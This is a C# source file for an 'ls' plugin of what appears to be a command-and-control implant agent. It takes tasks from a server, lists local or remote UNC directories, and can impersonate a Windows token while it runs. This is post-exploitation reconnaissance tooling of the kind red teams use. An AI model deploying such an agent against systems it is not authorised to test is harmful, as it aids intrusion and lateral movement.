using System.Net;
using Agent.Interfaces;
using Agent.Utilities;
using Agent.Models;

namespace Agent
{
    public class Plugin : IPlugin
    {

        public string Name => "ls";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            if (job.task.token != 0)
            {
                tokenManager.Impersonate(job.task.token);
            }
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            if (args["path"].Contains(":")) //If the path contains a colon, it's likely a windows path and not UNC
            {
                if (args["path"].Split('\\').Count() == 1) //It's a root dir and didn't include a \
                {
                    args["path"] = args["path"] + "\\";
                }

                await messageManager.AddResponse(LocalListing.GetLocalListing(args["path"], job.task.id));

                //TaskResponseHandler.AddResponse(ReturnLocalListing(args["path"], args["task-id"]));
            }
            else //It could be a local *nix path or a remote UNC
            {
                if (args["host"].Equals(Dns.GetHostName(), StringComparison.OrdinalIgnoreCase)) //If it's the same name as the current host
                {
                    await messageManager.AddResponse(LocalListing.GetLocalListing(args["path"], job.task.id));
                }
                else //UNC Host
                {
                    string fullPath = Path.Join(args["host"], args["path"]);
                    string host = args["host"];
                    if (host == "" && args["path"].StartsWith("\\\\"))
                    {
                        host = new Uri(args["path"]).Host;
                    }
                    else
                    {
                        fullPath = Path.Join("\\\\" + host, args["path"]);
                    }
                    await messageManager.AddResponse(RemoteListing.GetRemoteListing(fullPath, host, job.task.id));
                }
            }
            if (job.task.token != 0)
            {
                tokenManager.Revert();
            }
        }
    }
}

